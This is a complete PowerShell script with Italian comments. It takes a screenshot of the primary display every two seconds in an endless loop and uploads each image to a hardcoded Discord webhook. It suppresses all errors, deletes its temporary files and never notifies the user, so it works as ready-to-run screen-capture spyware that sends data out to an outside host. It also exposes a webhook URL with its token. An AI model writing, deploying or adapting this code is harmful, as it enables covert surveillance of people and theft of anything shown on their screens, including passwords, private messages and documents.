# Script PowerShell per catturare screenshot ogni 2 secondi e inviarli a Discord

# Configurazione
$webhookUrl = "https://discord.com/api/webhooks/1410535809433735239/DXXwU_UieiC-18PPY-iq_riXQVyh8dmCHp_RHubnhn8yHnydV491FNWGPNUePU-MeyfA"
$intervalSeconds = 2

# Funzione per catturare screenshot
function Get-Screenshot {
    try {
        # Carica le assembly necessarie per catturare lo schermo
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        # Ottieni le dimensioni dello schermo
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $width = $screen.Width
        $height = $screen.Height
        
        # Crea bitmap e graphics object
        $bitmap = New-Object System.Drawing.Bitmap $width, $height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        # Cattura lo screenshot
        $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
        
        # Converti in stream di memoria
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $imageBytes = $memoryStream.ToArray()
        
        # Pulisci le risorse
        $graphics.Dispose()
        $bitmap.Dispose()
        $memoryStream.Dispose()
        
        return $imageBytes
    }
    catch {

        return $null
    }
}

# Funzione per inviare messaggio di testo a Discord
function Send-MessageToDiscord {
    param (
        [string]$message
    )
    
    try {
        $body = @{
            content = $message
        } | ConvertTo-Json
        
        $headers = @{
            'Content-Type' = 'application/json'
        }
        
        $null = Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -Headers $headers
        return $true
    }
    catch {

        return $false
    }
}



# Funzione per inviare screenshot a Discord
function Send-ScreenshotToDiscord {
    param (
        [byte[]]$imageBytes
    )
    
    try {
        # Crea un file temporaneo
        $tempFile = [System.IO.Path]::GetTempFileName()
        $tempPngFile = $tempFile -replace '\.tmp$', '.png'
        
        try {
            # Salva l'immagine temporaneamente
            [System.IO.File]::WriteAllBytes($tempPngFile, $imageBytes)
            
            # Costruisci multipart form data correttamente per Discord
            $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString().Replace("-", "")
            $CRLF = "`r`n"
            
            # Leggi il file come byte array
            $fileBytes = [System.IO.File]::ReadAllBytes($tempPngFile)
            $fileName = "screenshot.png"
            
            # Costruisci il body multipart con formato corretto
            $bodyStart = "--$boundary$CRLF" +
                        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$CRLF" +
                        "Content-Type: image/png$CRLF$CRLF"
            
            $bodyEnd = "$CRLF--$boundary--$CRLF"
            
            # Converti le parti testuali in byte array usando UTF-8
            $bodyStartBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStart)
            $bodyEndBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyEnd)
            
            # Combina tutto: header + file + footer
            $totalLength = $bodyStartBytes.Length + $fileBytes.Length + $bodyEndBytes.Length
            $bodyBytes = New-Object byte[] $totalLength
            
            [System.Array]::Copy($bodyStartBytes, 0, $bodyBytes, 0, $bodyStartBytes.Length)
            [System.Array]::Copy($fileBytes, 0, $bodyBytes, $bodyStartBytes.Length, $fileBytes.Length)
            [System.Array]::Copy($bodyEndBytes, 0, $bodyBytes, $bodyStartBytes.Length + $fileBytes.Length, $bodyEndBytes.Length)
            
            # Invia la richiesta con header corretto
            $headers = @{
                'Content-Type' = "multipart/form-data; boundary=$boundary"
            }
            
            $null = Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $bodyBytes -Headers $headers
        }
        finally {
            # Pulisci i file temporanei
            if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
            if (Test-Path $tempPngFile) { Remove-Item $tempPngFile -Force -ErrorAction SilentlyContinue }
        }
        

        return $true
    }
    catch {

        return $false
    }
}

# Funzione principale
function Start-ScreenshotCapture {
    $counter = 0
    
    while ($true) {
        try {
            $counter++
            
            # Cattura screenshot
            $imageBytes = Get-Screenshot
            
            if ($null -ne $imageBytes) {
                # Invia a Discord
                Send-ScreenshotToDiscord -imageBytes $imageBytes
            }
            
            # Attendi prima del prossimo screenshot
            Start-Sleep -Seconds $intervalSeconds
        }
        catch {
            # Continua anche in caso di errori
            Start-Sleep -Seconds $intervalSeconds
        }
    }
}

# Verifica assembly e avvio
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    # Avvia la cattura
    Start-ScreenshotCapture
}
catch {
    exit 1
}
